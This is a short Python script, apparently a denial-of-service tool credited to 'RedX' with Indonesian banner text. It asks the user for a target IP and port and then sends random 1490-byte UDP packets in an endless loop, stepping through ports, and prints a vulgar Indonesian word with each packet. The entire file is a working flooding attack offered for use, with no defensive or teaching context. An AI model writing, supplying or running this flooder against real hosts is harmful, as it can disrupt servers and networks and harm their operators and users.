import sys,os,time,socket,random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("""\u001b[31m
>> Welcome
>>>>> jangan abuse
>>>>>>>>> Tools by RedX""")

ip = str(input("Ip : "))
port = int(input("Port :"))

os.system("clear")
os.system("figlet Attack Starting")
print("Start Sent all Pakets to Server")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("kontol")    
     if port == 65534:
       port = 1
     
